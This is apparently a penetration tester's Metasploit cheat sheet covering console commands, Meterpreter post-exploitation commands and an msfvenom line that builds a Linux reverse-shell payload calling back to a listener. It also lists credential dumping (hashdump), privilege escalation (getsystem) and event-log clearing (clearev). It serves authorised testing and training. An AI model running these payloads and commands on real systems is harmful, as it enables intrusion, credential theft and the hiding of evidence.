# Metasploit

Open-source exploitation framework with a large library of exploits, payloads, and post-exploitation modules.

## When I Use It

* Exploiting a known-vulnerable service where a reliable module exists
* Generating payloads with msfvenom
* Post-exploitation on a Meterpreter session: enumeration, pivoting, credential access

## Installation

Included in Kali. Initialize the database first with `msfdb init`, then start the console with `msfconsole`.

## Common Tasks

### Console Workflow

| Command | Purpose |
| :--- | :--- |
| `search <term>` | Find a module (for example `search eternalblue`) |
| `use <module>` | Select a module |
| `show options` / `info` | Show and explain module settings |
| `set RHOSTS <ip>` / `set LHOST <ip>` | Set target and listener |
| `show payloads` / `set payload <n>` | Choose a payload |
| `exploit` / `run` | Launch |
| `sessions -i <id>` | Interact with a session |

### Generating Payloads with msfvenom

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf > shell.elf
msfvenom --list payloads | grep meterpreter
```

### Meterpreter Commands

| Category | Commands |
| :--- | :--- |
| Core | `background`, `sessions`, `migrate`, `load`, `run`, `info` |
| File system | `cd`, `ls`, `pwd`, `cat`, `edit`, `rm`, `search`, `upload`, `download` |
| Networking | `ipconfig`, `netstat`, `arp`, `route`, `portfwd` |
| System | `getuid`, `getpid`, `ps`, `shell`, `sysinfo`, `clearev` |
| Privilege / creds | `getsystem`, `hashdump` |

## Reading the Output

* `getuid` after a session confirms the privilege level you landed with
* Prefer `check` before `exploit` where a module supports it, to confirm the target is vulnerable without firing
* Background a shell with Ctrl+Z and upgrade it to Meterpreter when you need the fuller command set

## Related

* [Windows Exploits](windows-exploits.md), [Linux Exploits](linux-exploits.md)
* [Network Services Attacks](network-services-attacks.md)
* [Discovery](../discovery/index.md) and [Privilege Escalation](../privilege-escalation/index.md) after a session lands

## Resources

* [Metasploit Documentation](https://docs.metasploit.com/)
* [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
* [PayloadsAllTheThings: Metasploit](https://github.com/swisskyrepo/PayloadsAllTheThings)
